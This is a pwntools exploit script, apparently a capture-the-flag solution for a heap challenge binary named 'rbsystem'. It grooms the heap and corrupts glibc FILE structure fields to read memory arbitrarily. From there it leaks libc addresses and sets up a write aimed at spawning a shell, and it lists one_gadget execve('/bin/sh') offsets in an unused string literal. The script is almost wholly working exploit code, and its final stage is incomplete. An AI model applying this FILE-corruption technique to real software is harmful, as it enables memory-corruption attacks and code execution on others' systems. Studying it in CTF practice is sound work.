#!/usr/bin/env python3
from pwn import *


def prompt(tube, choice):
    tube.recvuntil(b'Your choice: ')
    tube.sendline(str(choice))


def allocate(tube, index, size=0x1000):
    prompt(tube, 1)
    tube.recvuntil(b'Index: ')
    tube.sendline(str(index))
    tube.recvuntil(b'Size: ')
    tube.sendline(str(size))


def edit(tube, index, offset, size):
    prompt(tube, 2)
    tube.recvuntil(b'Index: ')
    tube.sendline(str(index))
    tube.recvuntil(b'Offset: ')
    tube.sendline(str(offset))
    tube.recvuntil(b'Size: ')
    tube.sendline(str(size))


def show(tube, index):
    prompt(tube, 3)
    tube.recvuntil(b'Index: ')
    tube.sendline(str(index))
    tube.recvuntil(b'Content: ')
    suffix = b'\n1. allocate\n'
    data = tube.recvuntil(suffix)
    return data[:-len(suffix)]


def open_file(tube):
    prompt(tube, 4)


def close_file(tube):
    prompt(tube, 5)


ATTACKER_INDEX = 15
FILE_ADDR_EXAMPLE = 0x558216da5350
READ_BASE_EXAMPLE = 0x558216da6590
ATTACKER_ADDR_EXAMPLE = 0x558216da5580
OFFSETOF_IO_READ_PTR = 8
OFFSETOF_IO_READ_END = 16
OFFSETOF_IO_READ_BASE = 24
OFFSETOF_IO_BUF_END = 64
OFFSETOF_CHAIN = 104
OFFSETOF_FILENO = 112
FLAGS = 0xfbad2488
IO_READ_PTR_EXAMPLE = 0x55a142446398
IO_READ_END_EXAMPLE = 0x55a142448590


def setup_heap(tube):
    """Heap layout: | 1k x 15 | FILE | 1k | _IO_read_base (1k) |"""
    for i in range(ATTACKER_INDEX):
        allocate(tube, i)
    open_file(tube)
    allocate(tube, ATTACKER_INDEX)


def overwrite_file_field(tube, offset, size):
    edit(tube, ATTACKER_INDEX, offset - (ATTACKER_ADDR_EXAMPLE - FILE_ADDR_EXAMPLE), size)


def leak_qword(tube):
    edit(tube, ATTACKER_INDEX, 0, 8)
    qword, = struct.unpack('<Q', show(tube, ATTACKER_INDEX).ljust(8, b'\x00'))
    return qword


def skip_until_file(tube):
    offset = 0
    for _ in range(0x10000 // 16):
        edit(tube, ATTACKER_INDEX, 0, 16)
        offset += 16
        dword, = struct.unpack('<I', show(tube, ATTACKER_INDEX)[:4].ljust(4, b'\x00'))
        if dword == FLAGS:
            return offset
    assert False, 'Could not find FILE'


def skip_n(tube, n):
    while n > 0x1000:
        edit(tube, ATTACKER_INDEX, 0, 0x1000)
        n -= 0x1000
    edit(tube, ATTACKER_INDEX, 0, n)


def main():
    tube = gdb.debug(['./rbsystem'], gdbscript=r'''
set logging overwrite on
set pagination off
set logging on
b malloc
commands
  python n = int(str(gdb.parse_and_eval('$rdi'))); gdb.execute('finish'); print('malloc(0x{:x}) = 0x{:x}'.format(n, int(str(gdb.parse_and_eval('$rax'))))); gdb.execute('c')
end
c
''')
    setup_heap(tube)
    overwrite_file_field(tube, OFFSETOF_IO_READ_END, 8)  # set _IO_read_end to a very large value, allowing infinite reading from heap
    for _ in range(2):  # skip urandom data and a bit more, so that _IO_read_ptr points to all 0s
        skip_n(tube, 0x1000)
    overwrite_file_field(tube, OFFSETOF_IO_READ_PTR, 2)  # rewind; now we are somewhere before FILE
    skip_n(tube, 14)  # align to 16-byte boundary
    file_offset = skip_until_file(tube)
    skip_n(tube, OFFSETOF_IO_READ_BASE - 16)  # position on _IO_read_base
    read_base = leak_qword(tube)
    print(f'read_base     = 0x{read_base:016x}')
    attacker_addr = read_base - (READ_BASE_EXAMPLE - ATTACKER_ADDR_EXAMPLE)
    print(f'attacker_addr = 0x{attacker_addr:016x}')
    skip_n(tube, OFFSETOF_CHAIN - OFFSETOF_IO_READ_BASE - 8)  # position on _chain
    stderr = leak_qword(tube)  # _chain points to _IO_2_1_stderr_
    print(f'stderr        = 0x{stderr:016x}')
    libc = stderr - 0x3ec680
    print(f'libc          = 0x{libc:016x}')
    assert libc & 0xfff == 0
    stdin = libc + 0x3eba00
    print(f'stdin         = 0x{stdin:016x}')
    skip_n(tube, 4)  # move _IO_read_ptr from _fileno to _flags2, which is known to be 0
    overwrite_file_field(tube, OFFSETOF_FILENO, 4)  # set _fileno to 0 (STDIN_FILENO)
    overwrite_file_field(tube, OFFSETOF_IO_READ_PTR, 2)  # rewind; now we are at a know offset before FILE
    skip_n(tube, file_offset - 2 + OFFSETOF_IO_BUF_END)  # position on _IO_buf_end
    overwrite_file_field(tube, OFFSETOF_IO_READ_END, 8)  # repair _IO_read_end
    skip_n(tube, IO_READ_END_EXAMPLE - IO_READ_PTR_EXAMPLE)  # repair _IO_read_ptr
    edit(tube, ATTACKER_INDEX, 0, 8)  # demo: copy from stdin to attacker_addr
    '''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
    tube.interactive()


if __name__ == '__main__':
    main()
